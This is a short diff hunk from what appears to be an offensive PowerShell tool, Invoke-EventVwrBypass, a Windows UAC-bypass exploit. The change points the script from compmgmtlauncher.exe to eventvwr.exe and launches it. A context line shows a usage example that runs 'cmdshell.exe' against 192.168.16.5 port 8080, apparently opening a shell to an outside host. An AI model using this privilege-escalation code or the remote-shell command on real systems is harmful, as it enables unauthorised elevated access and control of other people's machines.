@@ -43,7 +43,7 @@ Invoke-EventVwrBypass -Force -Command 'c:\test\cmdshell.exe 192.168.16.5 8080'
             exit
         }
 
-        $EventvwrPath = Join-Path -Path ([Environment]::GetFolderPath('System')) -ChildPath 'compmgmtlauncher.exe'
+        $EventvwrPath = Join-Path -Path ([Environment]::GetFolderPath('System')) -ChildPath 'eventvwr.exe'
         #Start Event Viewer
         if ($PSCmdlet.ShouldProcess($EventvwrPath, 'Start process')) {
             $Process = Start-Process -FilePath $EventvwrPath -PassThru
